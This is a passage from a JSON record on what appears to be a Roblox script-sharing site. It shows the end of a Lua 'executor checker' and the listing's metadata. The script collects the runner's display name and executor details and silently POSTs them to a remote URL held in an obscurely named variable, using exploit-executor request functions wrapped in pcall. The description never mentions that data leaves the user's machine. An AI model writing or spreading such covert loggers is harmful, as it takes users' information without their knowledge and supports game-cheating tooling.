isplay name: %s\nExecutor: %s\nExecutor Version: %s\nExecutor Level: %s\n<------------------------------>\n]], clock, names_v, exec_n, exec_v, d_lvl)\n\nlocal final_shit = {\n    [\"content\"] = payload_v\n}\n\npcall(function()\n    local wasd_send = syn and syn.request or http_request or request or (http and http.request)\n    if wasd_send then\n        wasd_send({\n            Url = asjkdhaksjdh,\n            Method = \"POST\",\n            Headers = {\n                [\"Content-Type\"] = \"application/json\"\n            },\n            Body = willy:JSONEncode(final_shit)\n        })\n    else\n        willy:PostAsync(asjkdhaksjdh, willy:JSONEncode(final_shit))\n    end\nend)","features":"So yeah thats for script creators, for example your script is not working for them tell them to use that and check the requirements for your script and check their executors if its not enough to execute your script","tags":["Executor","Checker","Information Logger","Executor Logger","Executor Information Logger"],"discord":"","keyLink":"","owner":{"_id":"679c1189dfb4dc3ebbb316a5","username":"xJaded05","verified":false,"profilePicture":{"url":"https://media.kocakz.me/afcad927cd6d2b11edeea043b8d864547c8f1be4cc44066da6ed3a1df1e17a03.webp","original":"https://scriptblox.com/images/photo/679c1189dfb4dc3ebbb316a5-1738281405440.jpg"},"status":"offline","id":"679c1189dfb4dc3ebbb316a5","profile":{"url":"https://media.kocakz.me/afcad927cd6d2b11edeea043b8d864547c8f1be4cc44066da6ed3a1df1e17a03.webp","original":"https://scriptblox.com/images/photo/679c1189dfb4dc3ebbb316a5-1738281405440.jpg"}},"reviewed":null,"liked":false,"disliked":false,"cstatus":{"verdict":"none","pct":null,"conf":0,"n":{"w":0,"b":0,"p":0,"d":0,"k":0},"total":0,"detected":false,"key":false,"recent":0,"at":"2026-10-21T02:40:12.532Z","last":"","win":14,"math":4},"isHub":false,"supportedGames":[],"changelog":[{"_id":"695d6754467e0f755edf4be6","editBy":{"_id":"679c1189dfb4dc3ebbb316a5","username":"xJaded05","status":"offline